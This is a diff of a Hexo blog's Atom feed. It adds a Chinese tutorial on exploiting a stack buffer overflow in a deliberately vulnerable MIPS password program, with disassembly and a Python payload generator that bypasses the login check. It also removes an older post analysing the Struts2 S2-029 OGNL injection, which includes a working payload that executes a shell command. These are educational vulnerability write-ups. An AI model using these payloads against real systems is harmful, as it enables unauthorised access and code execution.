@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://xdxd.love/"/>
-  <updated>2016-10-19T02:49:35.000Z</updated>
+  <updated>2016-11-19T07:07:32.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -14,6 +14,122 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>一个简单的mips架构缓冲区溢出分析</title>
+    <link href="http://xdxd.love/2016/11/19/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
+    <id>http://xdxd.love/2016/11/19/一个简单的mips架构缓冲区溢出分析/</id>
+    <published>2016-11-19T07:00:17.000Z</published>
+    <updated>2016-11-19T07:07:32.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="缓冲区溢出原理">缓冲区溢出原理</h1><p>简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。(注1)</p>
+<h1 id="简单示例">简单示例</h1><pre><code><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
+<span class="preprocessor">#<span class="keyword">include</span> <span class="string">"string.h"</span></span>
+<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{
+    <span class="keyword">char</span> password[<span class="number">100</span>];
+    <span class="built_in">printf</span>(<span class="string">"\nPlease input your Password: "</span>);
+    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, password);
+    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, <span class="string">"stackoverflow"</span>)) {
+        <span class="built_in">printf</span>(<span class="string">"Welcome to the new world\n"</span>);
+    }<span class="keyword">else</span> {
+        <span class="built_in">printf</span>(<span class="string">"Login failed\nGoodbye!\n"</span>);
+    }
+    <span class="keyword">return</span> <span class="number">0</span>;
+}
+</code></pre><p>编译代码生成可执行文件。</p>
+<pre><code><span class="regexp">/root/</span>buildroot-<span class="number">2016.05</span><span class="regexp">/output/</span>host<span class="regexp">/usr/</span>bin/mipsel-linux-gcc secret.c -o secret -<span class="keyword">static</span>
+</code></pre><p>可以看到这个程序的逻辑比较简单，她要求用户输入一个密码。然后检查密码是否正确，如果正确，就打印欢迎信息，如果错误就返回登录失败的信息。</p>
+<p><img src="/images/simplemips1.png" alt=""></p>
+<p>对于一个正常的应用来说，100个字符的用户名应该足够了。但是如果有人输入了超过100个字符的用户名会有什么情况发生呢。scanf并不会去检查边界，而是盲目的接受所有的字符。</p>
+<p>我们来测试一下输入超过100个字符的密码。</p>
+<p>可以看到程序正常的运行结束之后抛出了一个提示：</p>
+<pre><code>qemu: uncaught <span class="keyword">target</span> signal 11 (Segmentation fault) - core dumped
+Segmentation fault
+</code></pre><p><img src="/images/simplemips2.png" alt=""></p>
+<p>使用qemu结合ida进行动态分析：</p>
+<p>运行程序程序，输入超长的用户名，发现程序运行0x61616161处的指令时发生了崩溃，引发了段故障错误。崩溃现场如图：</p>
+<p><img src="/images/simplemips3.png" alt=""></p>
+<p>可以看到stack view中栈空间充满了61616161，而且寄存器$RA,$FP的值都是61616161，61是我们输入的用户名字母a的16进制编码。所以，超长的字符串劫持了程序的执行流程，让程序执行到了0x61616161这个我们可控的地址继续执行，而这个地址使我们随意输入的，从而导致了程序崩溃。</p>
+<h1 id="栈空间布局分析">栈空间布局分析</h1><p>因为我们有程序的源码，而且程序比较简单。所以直接阅读汇编代码也比较清晰，只有一个判断分支。</p>
+<p><img src="/images/simplemips4.png" alt=""></p>
+<h1 id="参考资料">参考资料</h1><p>栈操作：MIPS32架构与X86架构一样，都是向低地址增长的。但在MIPS32架构中没有EBP(栈底指针)，进入一个函数时，需要将当前栈指针向下移动n比特，这个大小为n比特的存储空间就是此函数的stack frame的存储区域。此后，栈指针便不在移动，只能在函数返回时将栈指针加上这个偏移量回复栈现场。由于不能随便移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量。</p>
+<p>返回地址：在x86架构中，使用call命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中。（注1）</p>
+<pre><code>addiu   <span class="label">$sp</span>, -0x88
+<span class="keyword">sw</span>      <span class="label">$ra</span>, 0x88+var_4(<span class="label">$sp</span>)
+<span class="keyword">sw</span>      <span class="label">$fp</span>, 0x88+var_8(<span class="label">$sp</span>)
+<span class="keyword">move</span>    <span class="label">$fp</span>, <span class="label">$sp</span>
+<span class="keyword">li</span>      <span class="label">$gp</span>, 0x4A6670
+<span class="keyword">sw</span>      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$sp</span>)
+lui     <span class="label">$v0</span>, 0x47  # '<span class="keyword">G</span>'
+addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aPleaseInputYou - 0x470000)  # <span class="string">"\nPlease input your Password: "</span>
+<span class="keyword">la</span>      <span class="label">$v0</span>, printf
+<span class="keyword">move</span>    <span class="label">$t9</span>, <span class="label">$v0</span>
+jalr    <span class="label">$t9</span> ; printf
+nop
+lw      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$fp</span>)
+lui     <span class="label">$v0</span>, 0x47  # '<span class="keyword">G</span>'
+addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aS_2 - 0x470000)  # <span class="string">"%s"</span>
+addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
+<span class="keyword">move</span>    <span class="label">$a1</span>, <span class="label">$v0</span>
+<span class="keyword">la</span>      <span class="label">$v0</span>, __isoc99_scanf
+<span class="keyword">move</span>    <span class="label">$t9</span>, <span class="label">$v0</span>
+jalr    <span class="label">$t9</span> ; __isoc99_scanf
+nop
+lw      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$fp</span>)
+addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
+<span class="keyword">move</span>    <span class="label">$a0</span>, <span class="label">$v0</span>
+
+addiu   <span class="label">$sp</span>, -0x88
+<span class="keyword">sw</span>      <span class="label">$ra</span>, 0x88+var_4(<span class="label">$sp</span>)
+<span class="keyword">sw</span>      <span class="label">$fp</span>, 0x88+var_8(<span class="label">$sp</span>)
+</code></pre><p>分配栈空间大小为0x88，然后将$ra,$fp保存在堆栈中。</p>
+<pre><code>addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aS_2 - 0x470000)  # <span class="string">"%s"</span>
+addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
+<span class="keyword">move</span>    <span class="label">$a1</span>, <span class="label">$v0</span>
+<span class="keyword">la</span>      <span class="label">$v0</span>, __isoc99_scanf
+</code></pre><p>scanf的参数a1为sp+0x18，可以计算出栈空间的分布。</p>
+<p><img src="/images/simplemips5.png" alt=""></p>
+<p>password分配了102个字节的空间，后面是上一个函数的栈指针和保存的$ra返回地址，让当前函数结束运行之后，CPU会从$ra处开始执行命令，而基础器$ra的值是从栈空间里保存的$ra处恢复的。（图片画错了，应该是$FP）</p>
+<p>当password长度为112个字节的时候，可以覆盖返回RA，从而控制返回地址。</p>
+<p><img src="/images/simplemips6.png" alt=""></p>
+<p>通过动态运行进行观察，输入数据为112个字节。</p>
+<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb
+</code></pre><p><img src="/images/simplemips7.png" alt=""></p>
+<p>返回地址覆盖成了61616262，然后程序会从0x61616262处开始执行，这会导致不可预料的后果，大部分情况都会导致内存访问违规。从而程序崩溃，抛出了段错误。</p>
+<h1 id="漏洞利用">漏洞利用</h1><p>既然我们可以控制程序从一个指定的地址开始执行命令，那么如果我们知道一个以前没有权限执行的危险命令的地址，就可以通过溢出的方式欺骗程序去执行这个命令。在这个例子中我们可以尝试在没有成功登陆的情况下执行成功登陆之后的一些指令。</p>
+<p>这里我们尝试用登录成功之后执行指令的地址覆盖$RA,从而在我们没有正确的密码的情况下获得需要输入密码才可以获得的信息。</p>
+<pre><code>.<span class="keyword">text</span>:<span class="number">00400878</span>                 lui     <span class="variable">$v0</span>, <span class="number">0x47</span>  # <span class="string">'G'</span>
+.<span class="keyword">text</span>:<span class="number">0040087</span>C                 addiu   <span class="variable">$a0</span>, <span class="variable">$v0</span>, (aWelcomeToTheNe - <span class="number">0x470000</span>)  # <span class="string">"Welcome to the new world"</span>
+.<span class="keyword">text</span>:<span class="number">00400880</span>                 la      <span class="variable">$v0</span>, puts
+.<span class="keyword">text</span>:<span class="number">00400884</span>                 <span class="keyword">move</span>    <span class="variable">$t9</span>, <span class="variable">$v0</span>
+.<span class="keyword">text</span>:<span class="number">00400888</span>                 jalr    <span class="variable">$t9</span> ; puts
+.<span class="keyword">text</span>:<span class="number">0040088</span>C                 nop
+.<span class="keyword">text</span>:<span class="number">00400890</span>                 lw      <span class="variable">$gp</span>, <span class="number">0x88</span>+var_78(<span class="variable">$fp</span>)
+.<span class="keyword">text</span>:<span class="number">00400894</span>                 j       loc_4008B8
+.<span class="keyword">text</span>:<span class="number">00400898</span>                 nop
+</code></pre><p>输入正确的密码之后，会跳转到0x00400878处执行。通过前面的分析，已经知道需要112个字节来覆盖$RA。写一个小脚本来生成我们需要的payload</p>
+<pre><code>import struct
+shellcode = <span class="string">"a"</span>*<span class="number">108</span>
+shellcode += struct.<span class="function"><span class="title">pack</span><span class="params">(<span class="string">"&gt;L"</span>,<span class="number">0</span>x00400878)</span></span>
+fw = <span class="function"><span class="title">open</span><span class="params">(<span class="string">'shellcode'</span>,<span class="string">'w'</span>)</span></span>
+fw.<span class="function"><span class="title">write</span><span class="params">(shellcode)</span></span>
+fw.<span class="function"><span class="title">close</span><span class="params">()</span></span>
+print ‘ok<span class="string">'</span>
+</code></pre><p>可以看到程序成功输出了 ‘welcome to the new world’。</p>
+<p><img src="/images/simplemips8.png" alt=""></p>
+<h1 id="参考资料-1">参考资料</h1><p>注1 :引用自&lt;&lt;解密家用路由器oday漏洞挖掘技术&gt;&gt;<br><a href="https://werewblog.wordpress.com/2015/11/23/a-simple-buffer-overflow-exploit-mips-architecture/" target="_blank" rel="external">A simple buffer overflow exploit (MIPS architecture)</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;缓冲区溢出原理&quot;&gt;缓冲区溢出原理&lt;/h1&gt;&lt;p&gt;简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。
+    
+    </summary>
+    
+      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>discuz最新版20160601 SSRF漏洞分析及修复方案</title>
@@ -1202,58 +1318,6 @@ W/System.err(<span class="number">24780</span>):    <span class="keyword">at</sp
     
     
       <category term="bugfree" scheme="http://xdxd.love/tags/bugfree/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>struts2 s2-029 漏洞</title>
-    <link href="http://xdxd.love/2016/03/21/struts2-s2-029-%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://xdxd.love/2016/03/21/struts2-s2-029-漏洞/</id>
-    <published>2016-03-21T02:14:55.000Z</published>
-    <updated>2016-03-22T08:23:23.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。</p>
-<pre><code>The Apache Struts frameworks performs double evaluation of attributes <span class="built_in">values</span> assigned <span class="keyword">to</span> certain <span class="keyword">tags</span> <span class="keyword">so</span> it <span class="keyword">is</span> possible <span class="keyword">to</span> pass in <span class="keyword">a</span> value that will <span class="keyword">be</span> evaluated again when <span class="keyword">a</span> <span class="keyword">tag</span>’<span class="keyword">s</span> attributes will <span class="keyword">be</span> rendered.
-</code></pre><p>目前网上已经有一些成熟的参考的资料了。详见文末参考资料。这次的漏洞虽然是代码执行。但是风险不高，需要开发者使用了特定的代码写法才会导致漏洞。需要直接将用户提交的数据通过标签设置成属性值。</p>
-<p>比如：</p>
-<pre><code><span class="tag">&lt;<span class="title">s:i18n</span> <span class="attribute">name</span>=<span class="value">"%&amp;#123#request.lan&amp;#125"</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="title">s:i18n</span>&gt;</span>
-<span class="tag">&lt;<span class="title">set</span> <span class="attribute">var</span>=<span class="value">"%&amp;#123#parameters.tang3&amp;#125"</span>/&gt;</span>
-</code></pre><p>通过<code>%&amp;#123#&amp;#125</code>的方式获取用户输入放入标签属性，会导致代码执行。struts2的修复方式也是直接过滤了<code>%&amp;#123&amp;#125</code>形式的字符串的ognl解析。</p>
-<p><img src="/images/struts0291.png" alt=""></p>
-<pre><code>这段代码的修改用来处理掉了非%&amp;<span class="preprocessor">#<span class="number">123</span>开头，&amp;#<span class="number">125</span>结尾的字符串进行ognl解析的功能，这里我们来举个例子：bar%&amp;#<span class="number">1232</span>+<span class="number">3</span>&amp;#<span class="number">125</span>，在修改之前的代码中<span class="number">2</span>+<span class="number">3</span>是会被作为ognl执行的。那么修改后，这种形式就只会被当做字符串来返回。</span>
-</code></pre><p>审计方式就是查看是否有<code>%&amp;#123#&amp;#125</code>这种方式获取用户输入变量复制给标签属性的代码写法。</p>
-<p>测试代码：</p>
-<pre><code><span class="xml"></span>&lt;%<span class="perl"><span class="variable">@page</span> import=<span class="string">"java.util.HashSet"</span></span>%&gt;<span class="xml">
-</span>&lt;%<span class="perl">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span>%&gt;<span class="xml">
-</span>&lt;%<span class="perl">@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> </span>%&gt;<span class="xml">
-<span class="tag">&lt;<span class="title">html</span>&gt;</span>
-<span class="tag">&lt;<span class="title">head</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>Demo jsp page<span class="tag">&lt;/<span class="title">title</span>&gt;</span><span class="tag">&lt;/<span class="title">head</span>&gt;</span>
-<span class="tag">&lt;<span class="title">body</span>&gt;</span>
-</span>&lt;%<span class="perl">
-  request.setAttribute(<span class="string">"lan"</span>, <span class="string">"'),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=<span class="variable">@java</span>.lang.Runtime<span class="variable">@getRuntime</span>(),#a.exec('touch /tmp/1111'),new java.lang.String('"</span>);
-</span>%&gt;<span class="xml">
-<span class="tag">&lt;<span class="title">s:i18n</span> <span class="attribute">name</span>=<span class="value">"%&amp;#123#request.lan&amp;#125"</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="title">s:i18n</span>&gt;</span>
-<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
-<span class="tag">&lt;/<span class="title">html</span>&gt;</span></span>
-</code></pre><p><img src="/images/struts0292.png" alt=""></p>
-<p>查看tmp目录文件已经生成。</p>
-<p><img src="/images/struts0293.png" alt=""></p>
-<h1 id="参考资料">参考资料</h1><p><a href="http://blog.nsfocus.net/struts-framework-s2-29-remote-code-execution-vulnerability/" target="_blank" rel="external">http://blog.nsfocus.net/struts-framework-s2-29-remote-code-execution-vulnerability/</a></p>
-<p><a href="http://seclab.dbappsecurity.com.cn/?p=678" target="_blank" rel="external">http://seclab.dbappsecurity.com.cn/?p=678</a></p>
-<p><a href="http://www.freebuf.com/vuls/99234.html" target="_blank" rel="external">http://www.freebuf.com/vuls/99234.html</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;The Apache Struts frameworks performs double evaluation of attributes &lt;span class=&quot;buil
-    
-    </summary>
-    
-      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-    
-      <category term="java" scheme="http://xdxd.love/tags/java/"/>
     
   </entry>
   
